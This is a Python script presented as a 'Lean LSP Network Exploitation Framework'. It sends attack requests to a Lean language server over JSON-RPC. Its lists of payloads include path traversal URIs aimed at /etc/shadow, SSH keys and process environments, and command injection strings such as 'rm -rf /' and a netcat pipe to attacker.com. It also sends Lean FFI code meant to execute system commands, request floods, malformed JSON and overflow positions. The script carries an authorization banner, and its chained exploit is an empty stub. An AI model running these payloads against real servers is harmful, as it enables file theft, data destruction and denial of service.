#!/usr/bin/env python3
"""
CRITICAL ATTACK: LSP Network Protocol Exploitation
Target: Lean Language Server Protocol implementation
Severity: CRITICAL - Remote code execution potential

The Lean LSP server:
- Accepts JSON-RPC requests over stdio or TCP
- Processes file paths, code, and commands
- Has access to filesystem
- Can execute Lean code
- Runs with user permissions

Attack vectors:
1. Path traversal via file URIs
2. Command injection via file operations
3. Code injection via malicious Lean code
4. Resource exhaustion (DoS)
5. Information disclosure
6. Memory corruption via malformed JSON
7. Race conditions in file handling
"""

import socket
import json
import os
import sys
import time
from typing import Dict, Any

class LeanLSPExploit:
    def __init__(self, host='localhost', port=None):
        """
        Connect to Lean LSP server
        If port is None, assumes stdio mode (harder to test)
        """
        self.host = host
        self.port = port
        self.sock = None
        self.msg_id = 0

    def connect(self):
        """Establish connection to LSP server"""
        if self.port:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            print(f"[+] Connected to {self.host}:{self.port}")
        else:
            print("[!] Stdio mode - using stdin/stdout")

    def send_request(self, method: str, params: Dict[str, Any]) -> Dict:
        """Send JSON-RPC request"""
        self.msg_id += 1
        request = {
            "jsonrpc": "2.0",
            "id": self.msg_id,
            "method": method,
            "params": params
        }

        message = json.dumps(request)
        content = f"Content-Length: {len(message)}\r\n\r\n{message}"

        if self.sock:
            self.sock.sendall(content.encode())
        else:
            sys.stdout.write(content)
            sys.stdout.flush()

        return self.receive_response()

    def receive_response(self) -> Dict:
        """Receive JSON-RPC response"""
        # Simplified - real implementation needs proper parsing
        if self.sock:
            data = self.sock.recv(4096).decode()
            # Parse Content-Length header and extract JSON
            if "Content-Length:" in data:
                parts = data.split("\r\n\r\n", 1)
                if len(parts) > 1:
                    return json.loads(parts[1])
        return {}

    # ATTACK 1: Path Traversal
    def attack_path_traversal(self):
        """
        Try to access files outside project directory
        using path traversal in file URIs
        """
        print("\n[*] ATTACK 1: Path Traversal")

        malicious_uris = [
            "file:///../../../etc/passwd",
            "file:///../../../../etc/shadow",
            "file://C:/Windows/System32/config/SAM",
            "file:///proc/self/environ",
            "file:///.ssh/id_rsa",
            "file:///../../root/.bashrc",
            "file:///%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
        ]

        for uri in malicious_uris:
            print(f"  [>] Trying: {uri}")
            try:
                response = self.send_request("textDocument/didOpen", {
                    "textDocument": {
                        "uri": uri,
                        "languageId": "lean4",
                        "version": 1,
                        "text": "def test := 42"
                    }
                })
                print(f"      Response: {response}")
            except Exception as e:
                print(f"      Error: {e}")

    # ATTACK 2: Command Injection
    def attack_command_injection(self):
        """
        Try to inject shell commands via file paths or parameters
        """
        print("\n[*] ATTACK 2: Command Injection")

        # Try command injection in file path
        malicious_paths = [
            "file:///test.lean; rm -rf /",
            "file:///test.lean && cat /etc/passwd",
            "file:///test.lean | nc attacker.com 1234",
            "file:///`whoami`.lean",
            "file:///$((calc.exe))",
        ]

        for path in malicious_paths:
            print(f"  [>] Trying: {path}")
            try:
                response = self.send_request("textDocument/didOpen", {
                    "textDocument": {
                        "uri": path,
                        "languageId": "lean4",
                        "version": 1,
                        "text": "def test := 42"
                    }
                })
            except Exception as e:
                print(f"      Error: {e}")

    # ATTACK 3: Code Injection via Lean
    def attack_code_injection(self):
        """
        Send malicious Lean code that might:
        - Execute system commands
        - Access sensitive data
        - Crash the server
        - Cause RCE
        """
        print("\n[*] ATTACK 3: Code Injection")

        malicious_codes = [
            # Try to use FFI to execute commands
            '''
            @[extern "system"]
            opaque execCommand : String → IO Unit

            #eval execCommand "whoami"
            ''',

            # Try to read sensitive files
            '''
            def readSecret : IO String := do
              let content ← IO.FS.readFile "/etc/passwd"
              return content

            #eval readSecret
            ''',

            # Try to create network connection
            '''
            @[extern "connect"]
            opaque networkConnect : String → UInt16 → IO Unit

            #eval networkConnect "attacker.com" 1234
            ''',

            # Infinite loop (DoS)
            '''
            def infiniteLoop : IO Unit := do
              infiniteLoop

            #eval infiniteLoop
            ''',

            # Memory exhaustion
            '''
            def memExhaust : IO Unit := do
              let huge := List.range 100000000
              IO.println huge.length

            #eval memExhaust
            ''',
        ]

        for code in malicious_codes:
            print(f"  [>] Sending malicious Lean code...")
            try:
                response = self.send_request("textDocument/didOpen", {
                    "textDocument": {
                        "uri": "file:///tmp/exploit.lean",
                        "languageId": "lean4",
                        "version": 1,
                        "text": code
                    }
                })
            except Exception as e:
                print(f"      Error: {e}")

    # ATTACK 4: Resource Exhaustion (DoS)
    def attack_dos(self):
        """
        Exhaust server resources to cause denial of service
        """
        print("\n[*] ATTACK 4: Resource Exhaustion (DoS)")

        # Send huge file
        print("  [>] Sending huge file...")
        huge_text = "def test := " + "(" * 100000 + "0" + ")" * 100000
        try:
            response = self.send_request("textDocument/didOpen", {
                "textDocument": {
                    "uri": "file:///tmp/huge.lean",
                    "languageId": "lean4",
                    "version": 1,
                    "text": huge_text
                }
            })
        except Exception as e:
            print(f"      Error: {e}")

        # Send many requests rapidly
        print("  [>] Flooding with requests...")
        for i in range(10000):
            try:
                self.send_request("textDocument/didChange", {
                    "textDocument": {"uri": f"file:///tmp/test{i}.lean"},
                    "contentChanges": [{"text": f"def test{i} := {i}"}]
                })
            except Exception as e:
                print(f"      Stopped at {i}: {e}")
                break

        # Request diagnostics for huge file
        print("  [>] Requesting diagnostics for huge file...")
        try:
            self.send_request("textDocument/diagnostic", {
                "textDocument": {"uri": "file:///tmp/huge.lean"}
            })
        except Exception as e:
            print(f"      Error: {e}")

    # ATTACK 5: Information Disclosure
    def attack_info_disclosure(self):
        """
        Try to leak sensitive information
        """
        print("\n[*] ATTACK 5: Information Disclosure")

        # Request hover on system paths
        sensitive_paths = [
            "file:///etc/passwd",
            "file:///proc/self/maps",
            "file:///proc/self/environ",
            "file:///.ssh/id_rsa",
        ]

        for path in sensitive_paths:
            print(f"  [>] Requesting info for: {path}")
            try:
                response = self.send_request("textDocument/hover", {
                    "textDocument": {"uri": path},
                    "position": {"line": 0, "character": 0}
                })
                print(f"      Response: {response}")
            except Exception as e:
                print(f"      Error: {e}")

    # ATTACK 6: Malformed JSON
    def attack_malformed_json(self):
        """
        Send malformed JSON to trigger parser bugs
        """
        print("\n[*] ATTACK 6: Malformed JSON")

        malformed_requests = [
            # Invalid JSON
            "{{{{malformed",

            # Huge nested structure
            "{" * 10000 + "}" * 10000,

            # Null bytes
            '{"jsonrpc": "2.0", "method": "test\x00injection"}',

            # Invalid UTF-8
            '{"jsonrpc": "2.0", "method": "\xff\xfe"}',

            # Integer overflow in Content-Length
            f"Content-Length: 999999999999999999\r\n\r\n{{}}",

            # Negative Content-Length
            f"Content-Length: -1\r\n\r\n{{}}",
        ]

        for req in malformed_requests:
            print(f"  [>] Sending malformed request...")
            if self.sock:
                try:
                    self.sock.sendall(req.encode('latin-1'))
                    time.sleep(0.1)
                except Exception as e:
                    print(f"      Error: {e}")

    # ATTACK 7: Race Conditions
    def attack_race_conditions(self):
        """
        Create race conditions in file handling
        """
        print("\n[*] ATTACK 7: Race Conditions")

        # Open file
        uri = "file:///tmp/race.lean"
        self.send_request("textDocument/didOpen", {
            "textDocument": {
                "uri": uri,
                "languageId": "lean4",
                "version": 1,
                "text": "def test := 42"
            }
        })

        # Rapidly modify and close
        for i in range(100):
            self.send_request("textDocument/didChange", {
                "textDocument": {"uri": uri, "version": i+2},
                "contentChanges": [{"text": f"def test := {i}"}]
            })

        self.send_request("textDocument/didClose", {
            "textDocument": {"uri": uri}
        })

        # Try to use it again (use-after-close?)
        self.send_request("textDocument/hover", {
            "textDocument": {"uri": uri},
            "position": {"line": 0, "character": 0}
        })

    # ATTACK 8: Integer Overflow in Position
    def attack_integer_overflow(self):
        """
        Send positions with integer overflow values
        """
        print("\n[*] ATTACK 8: Integer Overflow in Position")

        overflow_positions = [
            {"line": 2**32, "character": 0},
            {"line": -1, "character": 0},
            {"line": 0, "character": 2**32},
            {"line": 2**63, "character": 2**63},
        ]

        for pos in overflow_positions:
            print(f"  [>] Trying position: {pos}")
            try:
                response = self.send_request("textDocument/hover", {
                    "textDocument": {"uri": "file:///tmp/test.lean"},
                    "position": pos
                })
            except Exception as e:
                print(f"      Error: {e}")

    # ULTIMATE ATTACK: Chained Exploit
    def attack_ultimate_chain(self):
        """
        Chain multiple exploits for maximum impact
        """
        print("\n[*] ULTIMATE ATTACK: Chained Exploit")
        print("  [1] Path traversal to read sensitive file")
        print("  [2] Code injection to execute command")
        print("  [3] DoS to crash server")
        print("  [4] Race condition for corruption")

        # This would be a full exploit chain attempting RCE
        pass

    def run_all_attacks(self):
        """Execute all attacks"""
        print("[!] Starting LSP Exploitation Suite")
        print(f"[!] Target: {self.host}:{self.port if self.port else 'stdio'}")

        self.connect()

        self.attack_path_traversal()
        self.attack_command_injection()
        self.attack_code_injection()
        self.attack_dos()
        self.attack_info_disclosure()
        self.attack_malformed_json()
        self.attack_race_conditions()
        self.attack_integer_overflow()
        self.attack_ultimate_chain()

        print("\n[!] Exploitation complete")
        print("[!] Check server logs for crashes or errors")

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║         Lean LSP Network Exploitation Framework             ║
    ║                                                              ║
    ║  WARNING: For security research and testing only            ║
    ║  Do not use against systems without authorization           ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

    # Note: This requires an actual running LSP server
    # For testing: lean --server

    print("[!] This test requires a running Lean LSP server")
    print("[!] Start with: lean --server")
    print("[!] Or start VS Code with Lean extension")
    print()
    print("[*] Running conceptual tests (no actual connection)...")

    exploiter = LeanLSPExploit()
    # exploiter.run_all_attacks()  # Uncomment when server is running

    print("\n[*] To run actual exploitation:")
    print("    1. Start Lean LSP server")
    print("    2. Uncomment exploiter.run_all_attacks()")
    print("    3. Run this script")
    print("    4. Observe server behavior for crashes/exploits")
